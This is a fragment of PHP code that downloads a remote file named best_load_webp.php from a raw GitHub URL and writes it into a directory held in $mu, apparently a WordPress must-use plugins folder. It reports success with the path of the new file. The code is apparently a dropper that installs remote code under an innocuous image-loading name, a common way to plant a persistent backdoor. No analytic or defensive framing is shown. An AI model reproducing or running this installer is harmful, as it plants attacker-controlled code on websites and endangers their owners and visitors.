...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://raw.githubusercontent.com/cantulope/cantutag/refs/heads/main/v4/best_load_webp.php');
...
die('err dir'); }
if (is_file($mu.'best_load_webp.php')) die('file exist');
$r = file_put_contents($mu.'best_load_webp.php', $c);
if ($r===false) die('err saving');
die('/best_load_webp.php');